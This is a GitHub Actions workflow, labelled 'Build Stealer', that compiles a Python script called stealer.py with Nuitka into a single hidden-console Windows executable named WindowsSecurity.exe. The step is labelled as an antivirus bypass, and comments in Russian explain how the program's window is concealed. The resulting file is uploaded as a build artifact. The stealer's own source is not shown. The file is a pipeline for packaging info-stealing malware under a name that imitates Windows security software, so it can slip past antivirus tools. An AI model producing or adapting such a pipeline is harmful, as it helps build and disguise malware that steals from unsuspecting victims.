# language: YAML, file: .github/workflows/build.yml
name: Build Stealer

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install nuitka ordered-set zstandard pywin32 pycryptodome pyperclip requests psutil pillow

      - name: Compile with Nuitka (Anti-Virus Bypass)
        run: |
          # Флаг --windows-disable-console скрывает черное окно
          # Флаг --onefile собирает все в один exe
          python -m nuitka --onefile --windows-disable-console --assume-yes-for-downloads --remove-output --output-filename=WindowsSecurity.exe stealer.py

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: stealer-exe
          path: WindowsSecurity.exe
          retention-days: 5
